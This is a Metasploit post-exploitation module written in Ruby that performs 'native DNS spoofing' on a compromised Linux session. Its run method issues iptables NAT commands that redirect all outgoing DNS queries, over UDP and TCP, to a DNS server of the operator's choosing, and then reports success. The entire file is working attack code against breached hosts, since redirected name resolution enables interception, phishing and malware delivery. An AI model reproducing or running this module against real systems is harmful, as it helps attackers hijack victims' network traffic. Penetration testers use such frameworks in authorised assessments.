##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize
    super(
      'Name'         => 'Native DNS Spoofing module',
      'Description'  => %q{
        This module will be applied on a session connected to a shell. It will redirect DNS Request to remote DNS server.
      },
      'Author'       => 'Alberto Rafael Rodriguez Iglesias <albertocysec[at]gmail.com>',
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
    )
    register_options(
      [
        OptString.new('ORIGIN_PORT', [true, 'Origin port','53']),
        OptString.new('DESTINY_PORT', [true, 'Destination port','53']),
        OptAddress.new('DESTINY_IP', [true, 'Needed','8.8.8.8'])
      ])
  end

  def run
    print_good("Spoofing DNS server...")
    cmd_exec("iptables -t nat -A OUTPUT -p udp --dport #{datastore['ORIGIN_PORT']} -j DNAT --to #{datastore['DESTINY_IP']}:#{datastore['DESTINY_PORT']}")
    cmd_exec("iptables -t nat -A OUTPUT -p tcp --dport #{datastore['ORIGIN_PORT']} -j DNAT --to #{datastore['DESTINY_IP']}:#{datastore['DESTINY_PORT']}")
    print_good("Successfully exploited.")
  end
end
